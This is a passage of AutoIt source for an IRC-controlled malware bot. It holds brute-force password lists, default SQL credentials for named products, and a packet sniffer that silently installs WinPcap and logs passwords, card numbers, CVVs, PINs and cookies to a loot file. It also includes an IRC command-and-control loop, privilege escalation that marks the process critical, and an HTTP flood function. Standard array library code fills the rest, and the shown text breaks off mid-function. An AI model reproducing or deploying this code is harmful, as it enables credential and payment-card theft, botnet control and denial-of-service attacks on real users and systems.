$pass[1526] = "pass12"
$pass[1527] = "passion"
$pass[1528] = "passwor"
$pass[1529] = "password1234"
$pass[1530] = "password12345"
$pass[1531] = "password!"
$pass[1532] = "passwords"
$pass[1533] = "penis"
$pass[1534] = "personal"
$pass[1535] = "phpadmin"
$pass[1536] = "player"
$pass[1537] = "please"
$pass[1538] = "pop3"
$pass[1539] = "porn"
$pass[1540] = "print"
$pass[1541] = "private"
$pass[1542] = "public"
$pass[1543] = "pussy"
$pass[1544] = "pw123"
$pass[1545] = "qqqq"
$pass[1546] = "qqqqq"
$pass[1547] = "querty"
$pass[1548] = "quest"
$pass[1549] = "qw1234er"
$pass[1550] = "qwe456"
$pass[1551] = "qweewq"
$pass[1552] = "QwerS"
$pass[1553] = "qwert1234"
$pass[1554] = "qwerty12"
$pass[1555] = "QWERTY!"
$pass[1556] = "qwertyu"
$pass[1557] = "qwertyui"
$pass[1558] = "qwewq"
$pass[1559] = "r00tmaster"
$pass[1560] = "radio"
$pass[1561] = "raiders"
$pass[1562] = "rainbow"
$pass[1563] = "ranger"
$pass[1564] = "rdp"
$pass[1565] = "recruit"
$pass[1566] = "replicate"
$pass[1567] = "root123"
$pass[1568] = "rootmaster"
$pass[1569] = "rootroot"
$pass[1570] = "router"
$pass[1571] = "ruby"
$pass[1572] = "safe"
$pass[1573] = "sample"
$pass[1574] = "saturn"
$pass[1575] = "scan"
$pass[1576] = "scorpio"
$pass[1577] = "seagate"
$pass[1578] = "secret"
$pass[1579] = "secure"
$pass[1580] = "security"
$pass[1581] = "sex"
$pass[1582] = "sexy"
$pass[1583] = "shadow"
$pass[1584] = "share"
$pass[1585] = "shit"
$pass[1586] = "silver"
$pass[1587] = "site"
$pass[1588] = "smtp"
$pass[1589] = "spam"
$pass[1590] = "sql"
$pass[1591] = "sqlexec"
$pass[1592] = "squirt"
$pass[1593] = "staff"
$pass[1594] = "strong"
$pass[1595] = "stupid"
$pass[1596] = "sucks"
$pass[1597] = "supervisor"
$pass[1598] = "temp!"
$pass[1599] = "temporary"
$pass[1600] = "temptemp"
$pass[1601] = "terra"
$pass[1602] = "test12"
$pass[1603] = "test1234"
$pass[1604] = "test12345"
$pass[1605] = "test123456"
$pass[1606] = "test!"
$pass[1607] = "tester"
$pass[1608] = "testing"
$pass[1609] = "testmail"
$pass[1610] = "testtest"
$pass[1611] = "tivoli"
$pass[1612] = "trouble"
$pass[1613] = "unknown"
$pass[1614] = "user1234"
$pass[1615] = "user12345"
$pass[1616] = "user12"
$pass[1617] = "user123456"
$pass[1618] = "veritas"
$pass[1619] = "virus"
$pass[1620] = "web"
$pass[1621] = "webmail"
$pass[1622] = "webmaster"
$pass[1623] = "welcome"
$pass[1624] = "whatever"
$pass[1625] = "white"
$pass[1626] = "wizard"
$pass[1627] = "work"
$pass[1628] = "www"
$pass[1629] = "xxxx"
$pass[1630] = "xxxxx"
$pass[1631] = "xxxxxx"
$pass[1632] = "zsxdcfvg"
$pass[1633] = "zxccxz"
$pass[1634] = "zxcxz"
$pass[1635] = "zzzz"
$pass[1636] = "vps"
$pass[1637] = "zzzzz"
Dim $sqluser[65]
$sqluser[0] = "sa"
$sqluser[1] = "sa"
$sqluser[2] = "sa"
$sqluser[3] = "sa"
$sqluser[4] = "sa"
$sqluser[5] = "admin"
$sqluser[6] = "sa"
$sqluser[7] = "sa"
$sqluser[8] = "ARIS9"
$sqluser[9] = "ADONI"
$sqluser[10] = "gts"
$sqluser[11] = "sa"
$sqluser[12] = "sa"
$sqluser[13] = "sa"
$sqluser[14] = "sa"
$sqluser[15] = "sa"
$sqluser[16] = "admin"
$sqluser[17] = "ADMIN"
$sqluser[18] = "FB"
$sqluser[19] = "sa"
$sqluser[20] = "sa"
$sqluser[21] = "sa"
$sqluser[22] = "sa"
$sqluser[23] = "admin"
$sqluser[24] = "LENEL"
$sqluser[25] = "sa"
$sqluser[26] = "stream"
$sqluser[27] = "sa"
$sqluser[28] = "cic"
$sqluser[29] = "sa"
$sqluser[30] = "cic"
$sqluser[31] = "sa"
$sqluser[32] = "sa"
$sqluser[33] = "sa"
$sqluser[34] = "admin"
$sqluser[35] = "sa"
$sqluser[36] = "sa"
$sqluser[37] = "sa"
$sqluser[38] = "sa"
$sqluser[39] = "sa"
$sqluser[40] = "sa"
$sqluser[41] = "sa"
$sqluser[42] = "secure"
$sqluser[43] = "sa"
$sqluser[44] = "wasadmin"
$sqluser[45] = "maxadmin"
$sqluser[46] = "mxintadm"
$sqluser[47] = "maxreg"
$sqluser[48] = "sa"
$sqluser[49] = "I2b2metadata"
$sqluser[50] = "I2b2demodata"
$sqluser[51] = "I2b2workdata"
$sqluser[52] = "I2b2metadata2"
$sqluser[53] = "I2b2demodata2"
$sqluser[54] = "I2b2workdata2"
$sqluser[55] = "I2b2hive"
$sqluser[56] = "mcUser"
$sqluser[57] = "aadbo"
$sqluser[58] = "wwdbo"
$sqluser[59] = "aaAdmin"
$sqluser[60] = "wwAdmin"
$sqluser[61] = "aaPower"
$sqluser[62] = "wwPower"
$sqluser[63] = "aaUser"
$sqluser[64] = "wwUser"
Dim $sqlpass[65]
$sqlpass[0] = "sa"
$sqlpass[1] = "admin"
$sqlpass[2] = "superadmin"
$sqlpass[3] = "password"
$sqlpass[4] = "default"
$sqlpass[5] = "admin"
$sqlpass[6] = "RPSsql12345"
$sqlpass[7] = "$ei$micMicro"
$sqlpass[8] = "N'*ARIS!1dm9n#'"
$sqlpass[9] = "BPMS"
$sqlpass[10] = "opengts"
$sqlpass[11] = "PracticeUser1"
$sqlpass[12] = "42Emerson42Eme"
$sqlpass[13] = "sqlserver"
$sqlpass[14] = "Cardio.Perfect"
$sqlpass[15] = "vantage12!"
$sqlpass[16] = "netxms"
$sqlpass[17] = "AIMS"
$sqlpass[18] = "AIMS"
$sqlpass[19] = "$easyWinArt4"
$sqlpass[20] = "DBA!sa@EMSDB123"
$sqlpass[21] = "V4in$ight"
$sqlpass[22] = "Pass@123"
$sqlpass[23] = "trinity"
$sqlpass[24] = "MULTIMEDIA"
$sqlpass[25] = "SilkCentral12!34"
$sqlpass[26] = "stream-1"
$sqlpass[27] = "cic"
$sqlpass[28] = "cic"
$sqlpass[29] = "cic!23456789"
$sqlpass[30] = "cic!23456789"
$sqlpass[31] = "Administrator1"
$sqlpass[32] = "M3d!aP0rtal"
$sqlpass[33] = "splendidcrm2005"
$sqlpass[34] = "gnos"
$sqlpass[35] = "Dr8gedog"
$sqlpass[36] = "dr8gedog"
$sqlpass[37] = "Password123"
$sqlpass[38] = "DBA!sa@EMSDB123"
$sqlpass[39] = "SECAdmin1"
$sqlpass[40] = "skf_admin1"
$sqlpass[41] = "SecurityMaster08"
$sqlpass[42] = "SecurityMaster08"
$sqlpass[43] = ""
$sqlpass[44] = "wasadmin"
$sqlpass[45] = "maxadmin"
$sqlpass[46] = "mxintadm"
$sqlpass[47] = "maxreg"
$sqlpass[48] = "capassword"
$sqlpass[49] = "i2b2metadata"
$sqlpass[50] = "i2b2demodata"
$sqlpass[51] = "i2b2workdata"
$sqlpass[52] = "i2b2metadata2"
$sqlpass[53] = "i2b2demodata2"
$sqlpass[54] = "i2b2workdata2"
$sqlpass[55] = "i2b2hive"
$sqlpass[56] = "medocheck123"
$sqlpass[57] = "pwddbo"
$sqlpass[58] = "pwddbo"
$sqlpass[59] = "pwAdmin"
$sqlpass[60] = "wwAdmin"
$sqlpass[61] = "pwPower"
$sqlpass[62] = "wwPower"
$sqlpass[63] = "pwUser"
$sqlpass[64] = "wwUser"
Global $RDPCreds = ""
If $Cmdline[0] > 0 Then
	If $CmdLine[1] = "sendmail" Then
		SendMail()
	EndIf
	If $CmdLine[1]= "monitor" Then
		If Not FileExists(@SystemDir & "\wpcap.dll") Then
			InetGet("https://www.winpcap.org/install/bin/WinPcap_4_1_3.exe", @TempDir & "\WinPcap_4_1_3.exe")
			Run(@TempDir & "\WinPcap_4_1_3.exe")
			WinWaitActive("WinPcap 4.1.3 Setup", "Welcome to the WinPcap")
			Send("!n")
			WinWaitActive("WinPcap 4.1.3 Setup", "License Agreement")
			Send("!a")
			WinWaitActive("WinPcap 4.1.3 Setup", "Installation options")
			ControlClick("WinPcap 4.1.3 Setup", "Installation options", "[CLASS:Button; INSTANCE:2]")
			WinWaitActive("WinPcap 4.1.3 Setup", "Completing the WinPcap")
			Send("!f")
		EndIf
		installPCAP()
		$winpcap = _PcapSetup()
		$pcap_devices = _PcapGetDeviceList()
		$iface = 0
		$pcap = _PcapStartCapture($pcap_devices[$iface][0], "host " & $pcap_devices[$iface][7] & " and " & $sniffopt, 0, 65536, 2 ^ 24, 0)
		Dim $keywords[20]
		$keywords[0] = "GET /"
		$keywords[1] = "POST /"
		$keywords[2] = "Host: "
		$keywords[3] = "User-Agent: "
		$keywords[4] = "Content-"
		$keywords[5] = "password="
		$keywords[6] = "user_name="
		$keywords[7] = "user="
		$keywords[8] = "Username="
		$keywords[9] = "User="
		$keywords[10] = "login="
		$keywords[11] = "email="
		$keywords[12] = "username="
		$keywords[13] = "holder="
		$keywords[14] = "number="
		$keywords[15] = "cvv="
		$keywords[16] = "pin="
		$keywords[17] = "transaction"
		$keywords[18] = "bank"
		$keywords[19] = "Cookie: "
		$lootHandle = FileOpen($lootLoc, 1)
		$sPacketText = ""
		$oldPacketText = ""
		While True
			$aPacket = _TCP_Recv($pcap)
			If UBound($aPacket) > 20 Then
				$sPacketText = BinaryToString("0x" & $aPacket[20])
				If $sPacketText = $oldPacketText Then
					Sleep(250)
					ContinueLoop
				EndIf
				If StringLen($sPacketText) > 13 Then
					For $key = 0 To UBound($keywords) - 1
						If StringInStr($sPacketText, $keywords[$key]) Then
							If Dec(Hex(BinaryToString("0x" & $aPacket[14]))) = 6667 Then ExitLoop
							$aPacketText = StringSplit(StringReplace($sPacketText, @CR, ""), @LF)
							For $aPT = 1 To UBound($aPacketText) - 1
								If StringInStr($aPacketText[$aPT], $keywords[$key]) Then
									FileWriteLine($lootHandle, $aPacketText[$aPT])
									FileFlush($lootHandle)
									$oldPacketText = $sPacketText
								EndIf
							Next
							$oldPacketText = $sPacketText
						Else
							ConsoleWrite($sPacketText & @CRLF)
						EndIf
					Next
				EndIf
			EndIf
			$oldPacketText = $sPacketText
		WEnd
	EndIf
EndIf
OnAutoItExitRegister("exitme")
Dim $hmutex
_Singleton("QODLNCCJWUDJDJDH", $hmutex)
botkiller()
fixsys()

_SetPrivilege("SeDebugPrivilege")
_SetProcessCritical(@AutoItPID, True)
TCPStartup()
Opt("TCPTimeout", 5000)
While 1
	Global $sock = connect($nodes)
	While 1
		$Recv = TCPRecv($sock, 8192)
		If @error Then ExitLoop
		Local $sData = StringSplit($Recv, @CRLF)
		For $i = 1 To $sData[0] Step 1
			Local $stemp = StringSplit($sData[$i], " ")
			If $stemp[1] == "" Then ContinueLoop
			If $stemp[0] < 2 Then ContinueLoop
			If $stemp[1] == "PING" Then pong($sock, $stemp[2])
			If $stemp[2] == "376" Or $stemp[2] == "422" Then
				changemode($sock, "+i", $nick)
				joinchannel($sock, $channel & " " & $key)
			ElseIf $stemp[2] == "352" Then
				newnickname($sock)
			EndIf
			Switch $stemp[2]
				Case "PRIVMSG"
					$user = StringMid($stemp[1], 2, StringInStr($stemp[1], "!") - 2)
					$msg = StringMid($sData[$i], StringInStr($sData[$i], ":", 0, 2) + 1)
					If StringLeft($msg, 1) = $trigger Then
						cmd($user, $stemp[3], $msg)
					EndIf
			EndSwitch
		Next
	WEnd
WEnd
Func __FTP_Init()
	$__ghWinInet_FTP = DllOpen('wininet.dll')
EndFunc   ;==>__FTP_Init
Func _armeflood($host, $port, $path, $time)
	$ip = TCPNameToIP($host)
	$port = Int($port)
	$time = Int($time)
	TCPStartup()
	Local $timer = TimerInit(), $diff = 0
	While 1
		$diff = TimerDiff($timer)
		If $diff >= $time * 1000 Then
			ExitLoop
		EndIf
		$httpsock = TCPConnect($ip, $port)
		While Not @error
			$sent = _httparme($host, $path, $httpsock)
			If $diff >= $time * 1000 Then
				ExitLoop
			EndIf
		WEnd
		TCPCloseSocket($httpsock)
	WEnd
EndFunc   ;==>_armeflood
Func _ArrayAdd(ByRef $aArray, $vValue, $iStart = 0, $sDelim_Item = "|", $sDelim_Row = @CRLF, $iForce = $ARRAYFILL_FORCE_DEFAULT)
	If $iStart = Default Then $iStart = 0
	If $sDelim_Item = Default Then $sDelim_Item = "|"
	If $sDelim_Row = Default Then $sDelim_Row = @CRLF
	If $iForce = Default Then $iForce = $ARRAYFILL_FORCE_DEFAULT
	If Not IsArray($aArray) Then Return SetError(1, 0, -1)
	Local $iDim_1 = UBound($aArray, $UBOUND_ROWS)
	Local $hDataType = 0
	Switch $iForce
		Case $ARRAYFILL_FORCE_INT
			$hDataType = Int
		Case $ARRAYFILL_FORCE_NUMBER
			$hDataType = Number
		Case $ARRAYFILL_FORCE_PTR
			$hDataType = Ptr
		Case $ARRAYFILL_FORCE_HWND
			$hDataType = Hwnd
		Case $ARRAYFILL_FORCE_STRING
			$hDataType = String
		Case $ARRAYFILL_FORCE_BOOLEAN
			$hDataType = "Boolean"
	EndSwitch
	Switch UBound($aArray, $UBOUND_DIMENSIONS)
		Case 1
			If $iForce = $ARRAYFILL_FORCE_SINGLEITEM Then
				ReDim $aArray[$iDim_1 + 1]
				$aArray[$iDim_1] = $vValue
				Return $iDim_1
			EndIf
			If IsArray($vValue) Then
				If UBound($vValue, $UBOUND_DIMENSIONS) <> 1 Then Return SetError(5, 0, -1)
				$hDataType = 0
			Else
				Local $aTmp = StringSplit($vValue, $sDelim_Item, $STR_NOCOUNT + $STR_ENTIRESPLIT)
				If UBound($aTmp, $UBOUND_ROWS) = 1 Then
					$aTmp[0] = $vValue
				EndIf
				$vValue = $aTmp
			EndIf
			Local $iAdd = UBound($vValue, $UBOUND_ROWS)
			ReDim $aArray[$iDim_1 + $iAdd]
			For $i = 0 To $iAdd - 1
				If String($hDataType) = "Boolean" Then
					Switch $vValue[$i]
						Case "True", "1"
							$aArray[$iDim_1 + $i] = True
						Case "False", "0", ""
							$aArray[$iDim_1 + $i] = False
					EndSwitch
				ElseIf IsFunc($hDataType) Then
					$aArray[$iDim_1 + $i] = $hDataType($vValue[$i])
				Else
					$aArray[$iDim_1 + $i] = $vValue[$i]
				EndIf
			Next
			Return $iDim_1 + $iAdd - 1
		Case 2
			Local $iDim_2 = UBound($aArray, $UBOUND_COLUMNS)
			If $iStart < 0 Or $iStart > $iDim_2 - 1 Then Return SetError(4, 0, -1)
			Local $iValDim_1, $iValDim_2 = 0, $iColCount
			If IsArray($vValue) Then
				If UBound($vValue, $UBOUND_DIMENSIONS) <> 2 Then Return SetError(5, 0, -1)
				$iValDim_1 = UBound($vValue, $UBOUND_ROWS)
				$iValDim_2 = UBound($vValue, $UBOUND_COLUMNS)
				$hDataType = 0
			Else
				Local $aSplit_1 = StringSplit($vValue, $sDelim_Row, $STR_NOCOUNT + $STR_ENTIRESPLIT)
				$iValDim_1 = UBound($aSplit_1, $UBOUND_ROWS)
				Local $aTmp[$iValDim_1][0], $aSplit_2
				For $i = 0 To $iValDim_1 - 1
					$aSplit_2 = StringSplit($aSplit_1[$i], $sDelim_Item, $STR_NOCOUNT + $STR_ENTIRESPLIT)
					$iColCount = UBound($aSplit_2)
					If $iColCount > $iValDim_2 Then
						$iValDim_2 = $iColCount
						ReDim $aTmp[$iValDim_1][$iValDim_2]
					EndIf
					For $j = 0 To $iColCount - 1
						$aTmp[$i][$j] = $aSplit_2[$j]
					Next
				Next
				$vValue = $aTmp
			EndIf
			If UBound($vValue, $UBOUND_COLUMNS) + $iStart > UBound($aArray, $UBOUND_COLUMNS) Then Return SetError(3, 0, -1)
			ReDim $aArray[$iDim_1 + $iValDim_1][$iDim_2]
			For $iWriteTo_Index = 0 To $iValDim_1 - 1
				For $j = 0 To $iDim_2 - 1
					If $j < $iStart Then
						$aArray[$iWriteTo_Index + $iDim_1][$j] = ""
					ElseIf $j - $iStart > $iValDim_2 - 1 Then
						$aArray[$iWriteTo_Index + $iDim_1][$j] = ""
					Else
						If String($hDataType) = "Boolean" Then
							Switch $vValue[$iWriteTo_Index][$j - $iStart]
								Case "True", "1"
									$aArray[$iWriteTo_Index + $iDim_1][$j] = True
								Case "False", "0", ""
									$aArray[$iWriteTo_Index + $iDim_1][$j] = False
							EndSwitch
						ElseIf IsFunc($hDataType) Then
							$aArray[$iWriteTo_Index + $iDim_1][$j] = $hDataType($vValue[$iWriteTo_Index][$j - $iStart])
						Else
							$aArray[$iWriteTo_Index + $iDim_1][$j] = $vValue[$iWriteTo_Index][$j - $iStart]
						EndIf
					EndIf
				Next
			Next
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return UBound($aArray, $UBOUND_ROWS) - 1
EndFunc   ;==>_ArrayAdd
Func _ArrayDelete(ByRef $aArray, $vRange)
	If Not IsArray($aArray) Then Return SetError(1, 0, -1)
	Local $iDim_1 = UBound($aArray, $UBOUND_ROWS) - 1
	If IsArray($vRange) Then
		If UBound($vRange, $UBOUND_DIMENSIONS) <> 1 Or UBound($vRange, $UBOUND_ROWS) < 2 Then Return SetError(4, 0, -1)
	Else
		Local $iNumber, $aSplit_1, $aSplit_2
		$vRange = StringStripWS($vRange, 8)
		$aSplit_1 = StringSplit($vRange, ";")
		$vRange = ""
		For $i = 1 To $aSplit_1[0]
			If Not StringRegExp($aSplit_1[$i], "^\d+(-\d+)?$") Then Return SetError(3, 0, -1)
			$aSplit_2 = StringSplit($aSplit_1[$i], "-")
			Switch $aSplit_2[0]
				Case 1
					$vRange &= $aSplit_2[1] & ";"
				Case 2
					If Number($aSplit_2[2]) >= Number($aSplit_2[1]) Then
						$iNumber = $aSplit_2[1] - 1
						Do
							$iNumber += 1
							$vRange &= $iNumber & ";"
						Until $iNumber = $aSplit_2[2]
					EndIf
			EndSwitch
		Next
		$vRange = StringSplit(StringTrimRight($vRange, 1), ";")
	EndIf
	If $vRange[1] < 0 Or $vRange[$vRange[0]] > $iDim_1 Then Return SetError(5, 0, -1)
	Local $iCopyTo_Index = 0
	Switch UBound($aArray, $UBOUND_DIMENSIONS)
		Case 1
			For $i = 1 To $vRange[0]
				$aArray[$vRange[$i]] = ChrW(0xFAB1)
			Next
			For $iReadFrom_Index = 0 To $iDim_1
				If $aArray[$iReadFrom_Index] == ChrW(0xFAB1) Then
					ContinueLoop
				Else
					If $iReadFrom_Index <> $iCopyTo_Index Then
						$aArray[$iCopyTo_Index] = $aArray[$iReadFrom_Index]
					EndIf
					$iCopyTo_Index += 1
				EndIf
			Next
			ReDim $aArray[$iDim_1 - $vRange[0] + 1]
		Case 2
			Local $iDim_2 = UBound($aArray, $UBOUND_COLUMNS) - 1
			For $i = 1 To $vRange[0]
				$aArray[$vRange[$i]][0] = ChrW(0xFAB1)
			Next
			For $iReadFrom_Index = 0 To $iDim_1
				If $aArray[$iReadFrom_Index][0] == ChrW(0xFAB1) Then
					ContinueLoop
				Else
					If $iReadFrom_Index <> $iCopyTo_Index Then
						For $j = 0 To $iDim_2
							$aArray[$iCopyTo_Index][$j] = $aArray[$iReadFrom_Index][$j]
						Next
					EndIf
					$iCopyTo_Index += 1
				EndIf
			Next
			ReDim $aArray[$iDim_1 - $vRange[0] + 1][$iDim_2 + 1]
		Case Else
			Return SetError(2, 0, False)
	EndSwitch
	Return UBound($aArray, $UBOUND_ROWS)
EndFunc   ;==>_ArrayDelete
Func _ArrayFindAll(Const ByRef $aArray, $vValue, $iStart = 0, $iEnd = 0, $iCase = 0, $iCompare = 0, $iSubItem = 0, $bRow = False)
	If $iStart = Default Then $iStart = 0
	If $iEnd = Default Then $iEnd = 0
	If $iCase = Default Then $iCase = 0
	If $iCompare = Default Then $iCompare = 0
	If $iSubItem = Default Then $iSubItem = 0
	If $bRow = Default Then $bRow = False
	$iStart = _ArraySearch($aArray, $vValue, $iStart, $iEnd, $iCase, $iCompare, 1, $iSubItem, $bRow)
	If @error Then Return SetError(@error, 0, -1)
	Local $iIndex = 0, $avResult[UBound($aArray, ($bRow ? $UBOUND_COLUMNS : $UBOUND_ROWS))] ; Set dimension for Column/Row
	Do
		$avResult[$iIndex] = $iStart
		$iIndex += 1
		$iStart = _ArraySearch($aArray, $vValue, $iStart + 1, $iEnd, $iCase, $iCompare, 1, $iSubItem, $bRow)
	Until @error
	ReDim $avResult[$iIndex]
	Return $avResult
EndFunc   ;==>_ArrayFindAll
Func _ArrayInsert(ByRef $aArray, $vRange, $vValue = "", $iStart = 0, $sDelim_Item = "|", $sDelim_Row = @CRLF, $iForce = $ARRAYFILL_FORCE_DEFAULT)
	If $vValue = Default Then $vValue = ""
	If $iStart = Default Then $iStart = 0
	If $sDelim_Item = Default Then $sDelim_Item = "|"
	If $sDelim_Row = Default Then $sDelim_Row = @CRLF
	If $iForce = Default Then $iForce = $ARRAYFILL_FORCE_DEFAULT
	If Not IsArray($aArray) Then Return SetError(1, 0, -1)
	Local $iDim_1 = UBound($aArray, $UBOUND_ROWS) - 1
	Local $hDataType = 0
	Switch $iForce
		Case $ARRAYFILL_FORCE_INT
			$hDataType = Int
		Case $ARRAYFILL_FORCE_NUMBER
			$hDataType = Number
		Case $ARRAYFILL_FORCE_PTR
			$hDataType = Ptr
		Case $ARRAYFILL_FORCE_HWND
			$hDataType = Hwnd
		Case $ARRAYFILL_FORCE_STRING
			$hDataType = String
	EndSwitch
	Local $aSplit_1, $aSplit_2
	If IsArray($vRange) Then
		If UBound($vRange, $UBOUND_DIMENSIONS) <> 1 Or UBound($vRange, $UBOUND_ROWS) < 2 Then Return SetError(4, 0, -1)
	Else
		Local $iNumber
		$vRange = StringStripWS($vRange, 8)
		$aSplit_1 = StringSplit($vRange, ";")
		$vRange = ""
		For $i = 1 To $aSplit_1[0]
			If Not StringRegExp($aSplit_1[$i], "^\d+(-\d+)?$") Then Return SetError(3, 0, -1)
			$aSplit_2 = StringSplit($aSplit_1[$i], "-")
			Switch $aSplit_2[0]
				Case 1
					$vRange &= $aSplit_2[1] & ";"
				Case 2
					If Number($aSplit_2[2]) >= Number($aSplit_2[1]) Then
						$iNumber = $aSplit_2[1] - 1
						Do
							$iNumber += 1
							$vRange &= $iNumber & ";"
						Until $iNumber = $aSplit_2[2]
					EndIf
			EndSwitch
		Next
		$vRange = StringSplit(StringTrimRight($vRange, 1), ";")
	EndIf
	If $vRange[1] < 0 Or $vRange[$vRange[0]] > $iDim_1 Then Return SetError(5, 0, -1)
	For $i = 2 To $vRange[0]
		If $vRange[$i] < $vRange[$i - 1] Then Return SetError(3, 0, -1)
	Next
	Local $iCopyTo_Index = $iDim_1 + $vRange[0]
	Local $iInsertPoint_Index = $vRange[0]
	Local $iInsert_Index = $vRange[$iInsertPoint_Index]
	Switch UBound($aArray, $UBOUND_DIMENSIONS)
		Case 1
			If $iForce = $ARRAYFILL_FORCE_SINGLEITEM Then
				ReDim $aArray[$iDim_1 + $vRange[0] + 1]
				For $iReadFromIndex = $iDim_1 To 0 Step -1
					$aArray[$iCopyTo_Index] = $aArray[$iReadFromIndex]
					$iCopyTo_Index -= 1
					$iInsert_Index = $vRange[$iInsertPoint_Index]
					While $iReadFromIndex = $iInsert_Index
						$aArray[$iCopyTo_Index] = $vValue
						$iCopyTo_Index -= 1
						$iInsertPoint_Index -= 1
						If $iInsertPoint_Index < 1 Then ExitLoop 2
						$iInsert_Index = $vRange[$iInsertPoint_Index]
					WEnd
				Next
				Return $iDim_1 + $vRange[0] + 1
			EndIf
			ReDim $aArray[$iDim_1 + $vRange[0] + 1]
			If IsArray($vValue) Then
				If UBound($vValue, $UBOUND_DIMENSIONS) <> 1 Then Return SetError(5, 0, -1)
				$hDataType = 0
			Else
				Local $aTmp = StringSplit($vValue, $sDelim_Item, $STR_NOCOUNT + $STR_ENTIRESPLIT)
				If UBound($aTmp, $UBOUND_ROWS) = 1 Then
					$aTmp[0] = $vValue
					$hDataType = 0
				EndIf
				$vValue = $aTmp
			EndIf
			For $iReadFromIndex = $iDim_1 To 0 Step -1
				$aArray[$iCopyTo_Index] = $aArray[$iReadFromIndex]
				$iCopyTo_Index -= 1
				$iInsert_Index = $vRange[$iInsertPoint_Index]
				While $iReadFromIndex = $iInsert_Index
					If $iInsertPoint_Index <= UBound($vValue, $UBOUND_ROWS) Then
						If IsFunc($hDataType) Then
							$aArray[$iCopyTo_Index] = $hDataType($vValue[$iInsertPoint_Index - 1])
						Else
							$aArray[$iCopyTo_Index] = $vValue[$iInsertPoint_Index - 1]
						EndIf
					Else
						$aArray[$iCopyTo_Index] = ""
					EndIf
					$iCopyTo_Index -= 1
					$iInsertPoint_Index -= 1
					If $iInsertPoint_Index = 0 Then ExitLoop 2
					$iInsert_Index = $vRange[$iInsertPoint_Index]
				WEnd
			Next
		Case 2
			Local $iDim_2 = UBound($aArray, $UBOUND_COLUMNS)
			If $iStart < 0 Or $iStart > $iDim_2 - 1 Then Return SetError(6, 0, -1)
			Local $iValDim_1, $iValDim_2
			If IsArray($vValue) Then
				If UBound($vValue, $UBOUND_DIMENSIONS) <> 2 Then Return SetError(7, 0, -1)
				$iValDim_1 = UBound($vValue, $UBOUND_ROWS)
				$iValDim_2 = UBound($vValue, $UBOUND_COLUMNS)
				$hDataType = 0
			Else
				$aSplit_1 = StringSplit($vValue, $sDelim_Row, $STR_NOCOUNT + $STR_ENTIRESPLIT)
				$iValDim_1 = UBound($aSplit_1, $UBOUND_ROWS)
				StringReplace($aSplit_1[0], $sDelim_Item, "")
				$iValDim_2 = @extended + 1
				Local $aTmp[$iValDim_1][$iValDim_2]
				For $i = 0 To $iValDim_1 - 1
					$aSplit_2 = StringSplit($aSplit_1[$i], $sDelim_Item, $STR_NOCOUNT + $STR_ENTIRESPLIT)
					For $j = 0 To $iValDim_2 - 1
						$aTmp[$i][$j] = $aSplit_2[$j]
					Next
				Next
				$vValue = $aTmp
			EndIf
			If UBound($vValue, $UBOUND_COLUMNS) + $iStart > UBound($aArray, $UBOUND_COLUMNS) Then Return SetError(8, 0, -1)
			ReDim $aArray[$iDim_1 + $vRange[0] + 1][$iDim_2]
			For $iReadFromIndex = $iDim_1 To 0 Step -1
				For $j = 0 To $iDim_2 - 1
					$aArray[$iCopyTo_Index][$j] = $aArray[$iReadFromIndex][$j]
				Next
				$iCopyTo_Index -= 1
				$iInsert_Index = $vRange[$iInsertPoint_Index]
				While $iReadFromIndex = $iInsert_Index
					For $j = 0 To $iDim_2 - 1
						If $j < $iStart Then
							$aArray[$iCopyTo_Index][$j] = ""
						ElseIf $j - $iStart > $iValDim_2 - 1 Then
							$aArray[$iCopyTo_Index][$j] = ""
						Else
							If $iInsertPoint_Index - 1 < $iValDim_1 Then
								If IsFunc($hDataType) Then
									$aArray[$iCopyTo_Index][$j] = $hDataType($vValue[$iInsertPoint_Index - 1][$j - $iStart])
								Else
									$aArray[$iCopyTo_Index][$j] = $vValue[$iInsertPoint_Index - 1][$j - $iStart]
								EndIf
							Else
								$aArray[$iCopyTo_Index][$j] = ""
							EndIf
						EndIf
					Next
					$iCopyTo_Index -= 1
					$iInsertPoint_Index -= 1
					If $iInsertPoint_Index = 0 Then ExitLoop 2
					$iInsert_Index = $vRange[$iInsertPoint_Index]
				WEnd
			Next
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return UBound($aArray, $UBOUND_ROWS)
EndFunc   ;==>_ArrayInsert
Func _ArraySearch(Const ByRef $aArray, $vValue, $iStart = 0, $iEnd = 0, $iCase = 0, $iCompare = 0, $iForward = 1, $iSubItem = -1, $bRow = False)
	If $iStart = Default Then $iStart = 0
	If $iEnd = Default Then $iEnd = 0
	If $iCase = Default Then $iCase = 0
	If $iCompare = Default Then $iCompare = 0
	If $iForward = Default Then $iForward = 1
	If $iSubItem = Default Then $iSubItem = -1
	If $bRow = Default Then $bRow = False
	If Not IsArray($aArray) Then Return SetError(1, 0, -1)
	Local $iDim_1 = UBound($aArray) - 1
	If $iDim_1 = -1 Then Return SetError(3, 0, -1)
	Local $iDim_2 = UBound($aArray, $UBOUND_COLUMNS) - 1
	Local $bCompType = False
	If $iCompare = 2 Then
		$iCompare = 0
		$bCompType = True
	EndIf
	If $bRow Then
		If UBound($aArray, $UBOUND_DIMENSIONS) = 1 Then Return SetError(5, 0, -1)
		If $iEnd < 1 Or $iEnd > $iDim_2 Then $iEnd = $iDim_2
		If $iStart < 0 Then $iStart = 0
		If $iStart > $iEnd Then Return SetError(4, 0, -1)
	Else
		If $iEnd < 1 Or $iEnd > $iDim_1 Then $iEnd = $iDim_1
		If $iStart < 0 Then $iStart = 0
		If $iStart > $iEnd Then Return SetError(4, 0, -1)
	EndIf
	Local $iStep = 1
	If Not $iForward Then
		Local $iTmp = $iStart
		$iStart = $iEnd
		$iEnd = $iTmp
		$iStep = -1
	EndIf
	Switch UBound($aArray, $UBOUND_DIMENSIONS)
		Case 1 ; 1D array search
			If Not $iCompare Then
				If Not $iCase Then
					For $i = $iStart To $iEnd Step $iStep
						If $bCompType And VarGetType($aArray[$i]) <> VarGetType($vValue) Then ContinueLoop
						If $aArray[$i] = $vValue Then Return $i
					Next
				Else
					For $i = $iStart To $iEnd Step $iStep
						If $bCompType And VarGetType($aArray[$i]) <> VarGetType($vValue) Then ContinueLoop
						If $aArray[$i] == $vValue Then Return $i
					Next
				EndIf
			Else
				For $i = $iStart To $iEnd Step $iStep
					If $iCompare = 3 Then
						If StringRegExp($aArray[$i], $vValue) Then Return $i
					Else
						If StringInStr($aArray[$i], $vValue, $iCase) > 0 Then Return $i
					EndIf
				Next
			EndIf
		Case 2 ; 2D array search
			Local $iDim_Sub
			If $bRow Then
				$iDim_Sub = $iDim_1
				If $iSubItem > $iDim_Sub Then $iSubItem = $iDim_Sub
